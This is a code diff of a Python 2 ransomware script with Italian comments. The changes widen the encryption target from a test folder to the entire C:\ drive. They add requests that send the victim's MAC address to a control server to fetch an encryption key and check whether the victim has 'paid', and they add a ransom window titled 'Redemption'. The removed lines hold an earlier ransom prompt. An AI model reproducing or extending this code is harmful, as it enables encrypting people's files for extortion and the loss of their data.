@@ -2,27 +2,33 @@ import os
 import requests
 from uuid import getnode as get_mac
 from cryptography.fernet import Fernet
+from sys import platform
 
-import wx
-
-import request
 from window import *
+import request
+
+def os_detecting():
+    if platform == "linux" or platform == "linux2":
+        return "linux"
+    elif platform == "darwin":
+        return "macos"
+    elif platform == "win32" or platform == "cygwin":
+        return "windows"
 
 
-def key_generation(key_path):
-    # Put this somewhere safe!
-    key = Fernet.generate_key()
+def key_generation(key_path, key):
+    print "key_generation: "+key
     write_file(key_path, key)
-    f = Fernet(key)
+    f = Fernet(str(key))
 
     print key
 
     return f
 
 
-def key_recuva(key_path):
-    key = open_file(key_path)
-    f = Fernet(key)
+def key_recuva(key_path, key):
+    #key = open_file(key_path)
+    f = Fernet(str(key))
 
     print key
 
@@ -70,34 +76,40 @@ def remove_file(path):
 
 #MAC Address
 mac = still_MAC_Address()
-print mac
+#O.S.
+print os_detecting()
+"""
+if os_detecting() == "linux" or os_detecting() == "macos":
+    root_path = "/"
+else
+    root_path = "C:\"
+"""
 
 key_path = ''
 key_name = 'kiavetta.key'
-root_path = '.\Experiment'
+root_path = "C:\\"
 
 # se esiste chiavetta, chiedi al server se quell'utente con quel MAC address ha pagato: se si decritta se no Null
 # altrimenti, invia la Request con quel MAC address, fai generare al server la chiave, e attraverso Response
 # usala per crittare tutto
-condition = False
-
-url = ""
-data = {"r": "Test"}
-
-req = request.Request(url, data)
 
 if os.path.isfile(key_path+key_name) and not os.path.isfile("check.check"):
     # 1) Request "ifUserPayed(MACAddress)"
     # 2) if True Decrypt everything
 
     # Create the Request
-    req = {"r": "IfUserPayed", "MAC": mac}
-    # Send the request...and store the response here
-    resp = True
+    req = request.Request({"r": "CheckMAC", "MAC": mac})
 
-    if resp:
+    # REQUEST TO SERVER
+    resp = req.CustomPostRequest(req.getData(), req.getUrl(), req.getHeaders())
+    print "CheckMAC"
+    print resp
+    print "chiave: "+resp["key"]
+
+    #check if payed
+    if resp["payed"]:
         # key = db stored key...
-        key = key_recuva(key_path+key_name)
+        key = key_recuva(key_path+key_name, resp["key"])
 
         #for every file stored, decrypt everything
         for root, dirs, files in os.walk(root_path):
@@ -124,16 +136,31 @@ if os.path.isfile(key_path+key_name) and not os.path.isfile("check.check"):
         #Remove kiavetta just for testing
         remove_file(key_path+key_name)
 
-        condition = True
+        # Create the Request
+        req = request.Request({"r": "DeleteMAC", "MAC": mac})
+
+        # REQUEST TO SERVER
+        resp = req.CustomPostRequest(req.getData(), req.getUrl(), req.getHeaders())
+        print "DeleteMAC"
+        print resp
 
 
 else:
     # 1) Request "CheckMAC(MACAddress)" return Key
     # 2) crypt everything
 
+    # Create the Request
+    req = request.Request({"r": "CheckMAC", "MAC": mac})
+
+    # REQUEST TO SERVER
+    resp = req.CustomPostRequest(req.getData(), req.getUrl(), req.getHeaders())
+    print "CheckMAC"
+    print resp
+
     if not os.path.isfile("check.check"):
         # key = db stored key...
-        key = key_generation(key_path+key_name)
+        key = key_generation(key_path+key_name, resp["key"])
+        print key
 
         # for every file stored, crypt everything
         for root, dirs, files in os.walk(root_path):
@@ -153,15 +180,9 @@ else:
 
         write_file("check.check", "")
 
-    finestra = Tk()
-    app = Application(finestra)
-    finestra.mainloop()
-
-
-    """
-    var = raw_input("TUTTI I TUOI FILE SONO CRITTATI! VUOI PAGARE 1000MILA SOLDI?")
-    if var.lower() == "si":
-        # Send to Server Payment Request
-        remove_file("check.check")
-        print "SAGGIA SCELTA. FAI RIPARTIRE IL PROGRAMMA PER DECRITTARE TUTTO"
-    """
+    # Open Window in Windows Desktop
+    window = Tk()
+    app = Application(window)
+    window.winfo_toplevel().title("Redemption")
+    window.minsize(width=250, height=180)
+    window.mainloop()
